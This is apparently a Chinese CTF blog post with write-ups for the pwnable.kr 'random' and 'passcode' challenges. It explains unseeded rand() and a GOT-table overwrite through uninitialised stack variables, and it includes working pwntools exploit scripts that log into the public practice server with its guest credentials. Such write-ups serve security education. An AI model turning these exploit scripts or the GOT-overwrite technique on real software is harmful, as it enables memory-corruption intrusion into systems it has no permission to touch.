---
layout: post
title: "「pwnable.kr」 持续更新中……"
subtitle: "天哪好久没更新了!!大四大四"
date: 2018-10-24 08:20:00
author:     "许大仙"
catalog: true
tags:
    - CTF
---

## 一、random WriteUp

### 1.题目：

![random题](/img/assets/img/random_title.jpg)

`1 pt`可以看出，这题不难呀！

### 2.反汇编源码：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-8h]
  int v5; // [rsp+Ch] [rbp-4h]

  v5 = rand();
  v4 = 0;
  __isoc99_scanf(&unk_400760, &v4);
  if ( (v5 ^ v4) == 0xDEADBEEF )
  {
puts("Good!");
system("/bin/cat flag");
  }
  else
  {
puts("Wrong, maybe you should try 2^32 cases.");
  }
  return 0;
}
```



**没有srand得到的种子！！！所以这个rand是假的。得到的“随机数”是固定的。**

### 3.rand函数的实现

linux下的rand是用类似下面的代码实现的：

```
static unsigned long next = 1;

/* RAND_MAX assumed to be 32767 */
int myrand(void) {
	next = next * 1103515245 + 12345;
	return((unsigned)(next/65536) % 32768);
}

void mysrand(unsigned seed) {
	next = seed;
}
```

myrand、mysrand分别对应rand和srand，但实际的rand实现会复杂一些。

如果你没有**调用srand设置随机数种子，seed的默认值会是0，而seed为0时所决定的序列是固定的【只要seed固定，产生的随机数都一样】**，而第一次调用rand()就是返回这个固定序列里的第1个元素，那它的值也是固定的，自然你的程序每次输出都一样了。

所以正确的写法应该是程序**初始化时用srand设置不同的随机数种子（只需要设置一次），例如srand(time(NULL))，但要注意，time(NULL)的值是隔1秒才改变一次的【只要你不是在同一秒内执行两次，每次输出结果都是不一样】，必要情况下可以考虑使用精度更高的时间函数**，如gettimeofday。

### 4.攻击脚本及思路

根据反汇编源码可知，只要(v5 ^ v4) == 0xDEADBEEF成立我们就可以执行system("/bin/cat flag");

而v5=rand(),gdb调试看一下rand的返回值为0x6b8b4567

![gdb调试得到固定值v5](/img/assets/img/v5_value.jpg)

```
__isoc99_scanf(&unk_400760, &v4);
```

![unk_400760的值](/img/assets/img/v4_value.jpg)

可知scanf("%d",&v4)，此处输入v4的值，要使(v5 ^ v4) == 0xDEADBEEF成立，则

> v4=v5^0xDEADBEEF=0x6b8b4567^0xDEADBEEF=0xB526FB88

**poc:**

```
#!/usr/bin/python
from pwn import *
re = ssh(host="pwnable.kr",password="guest",user="random",port=2222).process("./random")
```

​    
​    payload =  0xB526FB88  #v4
​    

```
re.sendline(str(payload)) #%d输入，转化成字符串形式整数形式
print re.recv()
```

![flag](random_break.jpg)





## 二、passcode WriteUp

### 1.回顾GOT和PLT表 ###

[参考GOT和PLT表](https://spidermana.github.io/ctf/2018/08/03/JOJXMAN3/)

PLT[0]是一个函数，这个函数的作用是通过GOT[0],GOT[1]和GOT[2]来正确绑定一个函数的真实地址到GOT表中来。而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过GOT[1]、GOT[0]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址[即动态链接器]，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。

![PLT/GOT表的两次解析](/img/assets/img/plt_got.jpg)

从而可知call 动态函数，就会跳转到对应的PLT[x]，而PLT[x]的小段代码，会跳转到GOT[y]，这里存储了真实运行时的动态函数地址或通过解析后会得到真实运行时的动态函数地址并在这里存储。

因此如果攻击某个对应函数A的GOT[x]，将GOT[x]处写入B函数的地址，那么就会在call A的时候跳转到B【即使之前A没有解析过，但是PLT表项中的jmp * GOT[x]还是会执行，只是不会跳转去解析出A函数地址了，而是直接jmp *GOT[x]=jmp B】

利用objdump -h 可执行文件名得到ELF文件的各个节信息。PLT表/节属于代码段，GOT表/节属于数据段。所以在no PIE【数据段和代码段的随机化】的情况下，GOT表和PLT表的条目地址不会改变。

综上所述，要进行GOT表攻击：

- 有动态函数A调用[call A]
- NO PIE或可以获得A函数对应的GOT表项地址
- 能**实现任意地址写**：
	- 堆溢出double-shot
	- 格式化字符串漏洞addr%k$s【详见[格式化字符串漏洞利用之泄露内存](https://spidermana.github.io/ctf/2018/08/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98/#2%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98%E4%BE%8B)】
	- 有read(0,buf,nbytes)【从键盘传送nbyte个字节到buf指针所指的内存中】，write，puts等函数可以构造对GOT表项写
	- 还有这题例子中的printf("%d",passcode1)【passcode1没有取地址操作】
	- ....


### 2.正式题解 ###

![passcode题目](/img/assets/img/pc_content.jpg)

通过Linux scp命令在Linux之间复制文件和目录，scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。

参数说明：

- 1： 强制scp命令使用协议ssh1
- 2： 强制scp命令使用协议ssh2
- 4： 强制scp命令只使用IPv4寻址
- 6： 强制scp命令只使用IPv6寻址
- P port：注意是大写的P, port是指定数据传输用到的端口号

![scp命令获取ssh远程链接主机的](/img/assets/img/pc_scp.jpg)

得到passcode和passcode.c文件，在本地进行反汇编和漏洞分析

#### （1）源码 ####

    #include <stdio.h>
    #include <stdlib.h>
    
    void login(){
    	int passcode1;
    	int passcode2;
    
    	printf("enter passcode1 : ");
    	scanf("%d", passcode1);
    	fflush(stdin);
    
    	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    	printf("enter passcode2 : ");
    scanf("%d", passcode2);
    
    	printf("checking...\n");
    	if(passcode1==338150 && passcode2==13371337){
    printf("Login OK!\n");
    system("/bin/cat flag");
    }
    else{
    printf("Login Failed!\n");
    		exit(0);
    }
    }
    
    void welcome(){
    	char name[100];
    	printf("enter you name : ");
    	scanf("%100s", name);
    	printf("Welcome %s!\n", name);
    }
    
    int main(){
    	printf("Toddler's Secure Login System 1.0 beta.\n");
    
    	welcome();
    	login();
    
    	// something after login...
    	printf("Now I can safely trust you that you have credential :)\n");
    	return 0;	
    }

#### （2）攻击思路 ####

NO PIE条件已具备，代码段和数据段地址不变，GOT表项也就稳定啦。

![passcode程序代码](checksec_pc.jpg)

分析代码的逻辑就是调用welcome()输入用户名，然后调用login()，在login()中：

![passcode程序代码](/img/assets/img/pc_code.jpg)

假如我们可以控制passcode地址下的值，就可以实现任意地址写：

![漏洞原理](/img/assets/img/pc_leak.jpg)

而控制要passcode的内容B，就要想办法控制栈上的数据，整个程序中还和输入有关的，输入到栈中的，只有welcome中：

      printf("enter you name : ");
      __isoc99_scanf("%100s", &v1);
      printf("Welcome %s!\n", &v1);

这里可以读取100个字节到栈中，那么这100个字节有没有包含passcode的内存单元呢？


首先，栈帧由esp标识界限，当esp-0xnum的时候【栈顶下降】，不会影响栈上的数据。

分析从main->welcome->login->main的过程，可以发现：

![任意地址写的实现](/img/assets/img/pc_break.jpg)


现在就剩下两个个问题了！

- scanf("%100s", name);中写入栈的100字节里面，哪个位置是未来login栈帧中的passcode1首地址？
- 这个任意地址写，要写哪个地址，写入什么呢？

![welcome反汇编结果](/img/assets/img/pc_name.jpg)
![login反汇编结果](/img/assets/img/pc_passcode1.jpg)

passcode1的内存单元位置是在%ebp-10h的地方，name的首地址是%ebp-70h的地方，这两个部分是有重叠的。由于"%100s"的限制，对name只能写100个字节，也就是从%ebp-70h开始写到%ebp-70h+100字节 = %ebp-70h+64h。

而%ebp-10h = %ebp-70h+60h是passcode1的地址，也就说明对name写的100字节中，前96个字节[60h]可以随便，最后4个字节[4h]恰好覆盖了passcode1的内存单元。

通过上面介绍的GOT表攻击可知，我们可以把这个任意地址写，用于写fflush动态链接库函数的GOT表项地址。
显然代码中有system("/bin/cat flag")的调用，那么就写入system("/bin/cat flag")的调用处的代码地址。

![login代码段](/img/assets/img/pc.jpg)


#### （3）攻击脚本 ####

    #!/usr/bin/python
    from pwn import *
    context(arch='i386',os='linux')
    local = 0
    if local:
    	re = process('./passcode')
    else:
    	re = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222).process('./passcode')  #ssh远程链接
    
    re.recv() #一直接收，直到timeout
    
    elf = ELF('./passcode')
    payload = 'a'*96+p32(elf.got['fflush']) #输入100个字符，前96个随便，后面4个字符为GOT中的fflush表项地址：p32(elf.got['fflush'])
    re.sendline(payload) 
    
    sys_addr = 0x080485E3 #login()中system("bin/cat flag")的地址
    print re.recv()
    
    payload2 = str(sys_addr) #由于是"%d"输入，所以就按照正常整数顺序输入即可，只是把十六进制整数变为10进制字符串型整数，0x080485E3 = 134514147D，str(sys_addr)=“134514147”
    re.sendline(payload2)
    re.recv()

注意：


- p32(0xabcdefgh)=\xgh\xeg\xcd\xab，将整数0xabcdefgh变为4字符字符串，是会考虑大小端问题的，0xgh低位在前[低地址],0xab高位在后[高地址]
- 而str(int类似数据)，只是把str(1234)="1234"而已，把某进制的整数变为十进制整数的字符串形式而已。
- %s读取字符，就是按照先读低位，再读高位而已。比如“%s”输入“1234”，就会1放在低地址，4放在高地址
- %d读取字符，会自动做大小端转换，对1234，就是1放在高地址，4放在低地址
- 总之，整数的读取就按照人为的感觉去写数字的位置，字符串形式读取整数值要考虑大小端顺序。

![获取flag](/img/assets/img/pc_attack.jpg)



